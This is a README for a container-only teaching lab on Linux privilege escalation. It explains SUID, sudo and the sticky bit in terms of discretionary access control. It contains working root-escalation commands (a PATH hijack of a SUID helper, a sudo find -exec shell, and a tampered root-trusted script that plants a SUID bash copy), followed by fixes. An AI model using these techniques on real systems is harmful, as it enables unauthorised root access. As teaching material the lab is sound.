# Privilege-escalation lab — SUID, sudo and the sticky bit

> ### ⚠ Deliberately vulnerable, container-only
> This image is misconfigured **on purpose**. It runs entirely inside a
> throwaway Docker container bound to nothing — it never listens on a network
> and never touches your host. Escalating to root *inside* the container is the
> exercise; the container is the scope. Do not copy any of these patterns onto
> a real machine, and do not run these techniques against hosts you do not own
> or have written authorisation to test (§5 of the week-7 README has the legal
> note).

The ACL lab attaches the policy to the **object** and RBAC attaches it to the
**subject**. This lab is about the third thing that decides what you can do:
**the identity a program runs as**, and the handful of mechanisms Unix uses to
change it. Almost all real-world Linux privilege escalation is one sentence:

> **an object a root process trusts — a binary it runs, a command it resolves,
> a file it reads — that an unprivileged user can influence.**

You will land as the unprivileged user `student` and reach `root` three ways,
each an instance of that sentence.

---

## Where this sits — Discretionary Access Control

Everything in week 7 so far — POSIX bits, ACLs, and the SUID/sudo mechanisms in
this lab — is **Discretionary Access Control (DAC)**. Two properties define it:

- **The owner sets the policy, at their discretion.** Whoever owns an object
  decides who may touch it — `chmod`, `setfacl`, `chown`, a line in `sudoers`.
  The system does not second-guess that choice.
- **Authority is identity-based and transitive.** A process runs *as* an
  identity and inherits everything that identity may do. Nothing tracks *where
  the instructions it follows came from*.

That second property is why this whole lab is possible. Every escalation below
is DAC **working exactly as configured** — no kernel bug, no memory corruption.
Someone with the discretion to set a policy set a poor one, and the reference
monitor enforced it faithfully. A SUID binary genuinely *is* root; sudo
genuinely *does* lend root; a world-writable directory genuinely *is* writable.
The vulnerability is discretionary misconfiguration, and DAC has no notion of
"root should not run a file an ordinary user could edit".

The layer that stops these *even when DAC is misconfigured* is **Mandatory
Access Control (MAC)** — SELinux, AppArmor — where an administrator writes a
policy the resource owner **cannot** override, confining what a program may do
regardless of the uid it runs as. Section 5 returns to this. Keep the contrast
in mind throughout: for each vector, ask *"who had the discretion to allow
this, and what would a mandatory policy have done instead?"*

---

## The three special permission bits

Beyond the nine `rwx` bits, a Unix file carries three more. `ls -l` shows them
in place of an execute bit, and they are the whole subject of this lab:

| Bit | Octal | On a file | Shows as |
| --- | --- | --- | --- |
| **setuid** | `4000` | runs as the file's **owner**, not the caller | `-rws------` |
| **setgid** | `2000` | runs as the file's **group** | `-r-xr-s---` |
| **sticky** | `1000` | on a **directory**: only a file's owner may delete it | `drwxrwxrwt` |

A lowercase `s`/`t` means the underlying execute bit is also set; an uppercase
`S`/`T` means it is not. The escalation vectors are **setuid** (vector A) and,
by analogy, an over-broad **sudo** grant (vector B). The **sticky** bit is the
odd one out — it *restricts* rather than grants — and vector C shows why its
*absence* is the bug.

> A note on the request that started this lab: the sticky bit is often blamed
> for SUID escalation, but it does the opposite job. This lab keeps all three
> straight instead of conflating them.

---

## Build and enter

You need Docker (Desktop on Windows/macOS, or Engine on Linux). From this
folder:

```bash
docker build -t privesc-lab .
docker run -it --rm privesc-lab
```

`-it` gives you an **interactive shell**; `--rm` throws the container away on
exit, so every run is a clean slate — escalate, break things, `exit`, start
over. You begin as `student` (password `student`, if anything asks):

```
student@abc123:~$ id
uid=1000(student) gid=1000(student) groups=1000(student)
```

`uid=1000`, not `0`. Everything below is about changing that.

---

## 1. Enumerate — the first thing anyone runs

Escalation starts with reconnaissance, and it is the *same* commands whether
you are attacking or hardening (week-7 README §5). Run these as `student`:

```bash
# Every setuid-root binary on the box — the classic first sweep
find / -perm -4000 -type f 2>/dev/null

# What may I run via sudo, and as whom?
sudo -l

# World-writable directories — where can I drop or replace files?
find / -type d -perm -0002 2>/dev/null
```

Three things stand out, one per vector:

- `/usr/local/bin/health-check` — a SUID-root binary that is not part of the OS.
- `sudo -l` reports `(root) NOPASSWD: /usr/bin/find`.
- `/incoming` is world-writable; `/shared` is world-writable **with a `t`**.

Read the SUID one before running it — an attacker would, and so should you:

```bash
ls -l /usr/local/bin/health-check      # -rwsr-xr-x  root root   (the s = setuid)
```

---

## 2. Vector A — a SUID binary that trusts your `$PATH`

Run it first to see what it does:

```bash
health-check
```

It prints load and memory. Nothing obviously wrong. But the source
([`src/health-check.c`](src/health-check.c)) has two lines that combine badly —
it calls `setuid(0)` to become root, then runs its helpers by **bare name**:

```c
setuid(0);
system("uptime");     /* "uptime", not "/usr/bin/uptime" */
```

`system()` runs `/bin/sh -c "uptime"`, and the shell finds `uptime` by walking
`$PATH` — **your** `$PATH`, inherited from the shell that launched it. So put
your own `uptime` first:

```bash
mkdir -p ~/bin
cat > ~/bin/uptime <<'EOF'
#!/bin/bash
/bin/bash            # this shell inherits the root identity setuid(0) set
EOF
chmod +x ~/bin/uptime
export PATH=~/bin:$PATH

health-check         # runs YOUR uptime — as root
```

```
student@abc123:~$ id
uid=0(root) gid=0(root) groups=0(root),1000(student)
student@abc123:~# cat /root/flag.txt
You are root. ...
```

You are root. It worked because the binary escalated (`setuid(0)` set your real
uid to 0) **and then** trusted input you control. Type `exit` to drop back to
the `health-check` process, and `exit` again to return to your `student` shell.

> **DAC angle.** Root exercised its discretion to make this binary SUID, and
> the system honoured that identity *completely* — including for the shell it
> spawned on your behalf. DAC lent the identity; it never asked whether the
> `uptime` that identity ran was one root would have trusted.

> Why a C binary and not a shell script? Modern Linux **ignores** the setuid
> bit on interpreted scripts precisely because of this class of bug — so a real
> SUID target is always compiled.

---

## 3. Vector B — a sudo rule that grants a shell

`sudo -l` told you that `student` may run `/usr/bin/find` as root with no
password. That sounds narrow — it is not. `find` can execute arbitrary
commands with `-exec`, so "run find as root" is "be root":

```bash
sudo find . -maxdepth 0 -exec /bin/sh \; -quit
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/flag.txt
```

`find` was already running as root (via sudo), so the shell it spawned is too —
no `$PATH` trick needed this time. Whole families of "harmless" binaries behave
this way (`vim`, `less`, `awk`, `tar`, `env`, …); [GTFOBins](https://gtfobins.github.io/)
catalogues them. The lesson: **a sudo grant is only as narrow as the binary's
ability to spawn other programs.** `exit` to return to `student`.

> **DAC angle.** sudo is DAC in its purest form — an administrator's
> discretionary decision to lend root's *identity* for one command. But DAC
> lends an identity, not a constrained action, so every capability that
> identity has travels with it. "May run `find` as root" and "is root" are the
> same sentence.

---

## 4. Vector C — the sticky bit, by its presence and its absence

This one is not a root shell — it is the *setup* for one, and it shows what the
sticky bit is actually for. Two world-writable directories, one difference:

```bash
ls -ld /shared /incoming
# drwxrwxrwt root root /shared     <- sticky (the trailing t)
# drwxrwxrwx root root /incoming   <- NOT sticky
```

Both contain a root-owned file. Try to delete each as `student`:

```bash
rm -f /shared/root-note.txt        # rm: cannot remove ... : Operation not permitted
rm -f /incoming/job.sh             # succeeds — the file is gone
```

You cannot delete inside `/shared`: the sticky bit says *only a file's owner
may unlink it*, even in a directory everyone can write. `/incoming` lacks the
bit, so **directory** write permission is enough to remove root's file — and to
replace it:

```bash
cat > /incoming/job.sh <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash    # what root would run for you
EOF
chmod +x /incoming/job.sh
```

Now any privileged process that trusts `/incoming/job.sh` — a root cron job, a
maintenance script — runs *your* content as root. That is the escalation; the
missing sticky bit is the whole vulnerability. `/shared` was written the way a
shared directory *should* be (`/tmp` is `1777` for exactly this reason).

> **DAC angle.** Root's process will read whatever sits at that path as its own
> trusted input, because DAC tracks the *identity* running (root) and the
> *permissions on the file* — never the fact that the file's contents were
> placed there by `student`. Provenance is exactly the thing DAC cannot see.

> There is no root cron running in this minimal image to fire the payload, so C
> stops at the tamper. In §1's enumeration on a real box, a world-writable file
> or directory that a root job touches is the find that matters.

---

## 5. Now fix them

Rebuild your mental model by seeing what each fix changes:

| Vector | The bug | The fix |
| --- | --- | --- |
| A — SUID `$PATH` | escalates, then resolves commands via caller's `$PATH` | call helpers by **absolute path** (`/usr/bin/uptime`), sanitise the environment, and **drop privileges** (`setuid(getuid())`) before doing anything not requiring root — or do not make it SUID at all |
| B — sudo `find` | a shell-capable binary granted wholesale | grant the *specific action*, not a general tool; never NOPASSWD a binary with `-exec`/shell-out; prefer a purpose-built, argument-checked wrapper |
| C — sticky bit | world-writable directory a root process trusts | set the sticky bit (`chmod +t`) so cross-owner deletes are blocked, and do not let privileged processes read or execute out of world-writable paths |

The through-line: every fix above is still **discretionary** — it is an owner
choosing a *better* policy. That is DAC's strength (anyone can tighten their own
resources) and its weakness (anyone with discretion can loosen them again, and a
single mistake is enough). RBAC (`rbac-demo`) draws the boundary at the verb,
ACLs at the object, these three at **identity** — but all of them are DAC, and
all of them can be misconfigured straight back open.

**Mandatory Access Control** is the answer to "what if the discretionary policy
is wrong?". Under SELinux or AppArmor an administrator confines the SUID binary
to a domain that cannot spawn a shell, forbids root from executing files out of
world-writable paths, and scopes what a `sudo`'d process may touch — a policy
the file owners *cannot* override at their discretion. DAC decides what you are
*allowed* to do; MAC decides what you are *permitted* to do even when DAC says
yes. Hardened production systems run both layers, which is exactly why a box
like this one — DAC only — is so much easier to escalate on than a real target.

---

## Cleanup

Nothing to clean — `--rm` deleted the container the moment you `exit`ed the
first shell, and the image change is gone with it. To remove the built image:

```bash
docker rmi privesc-lab
```

---

## Reference

- [GTFOBins](https://gtfobins.github.io/) — Unix binaries abusable for SUID/sudo escalation
- [LOLBAS](https://lolbas-project.github.io/) — the Windows equivalent
- `man 2 setuid`, `man 7 credentials` — real vs effective vs saved uid
- `man 1 sudo`, `man 5 sudoers` — how grants are actually scoped
- `man 1 chmod` — the special-bits section; `find / -perm -4000` is the standard SUID sweep
- Automated enumeration in the wild: LinPEAS / linux-smart-enumeration run every check in §1 and more
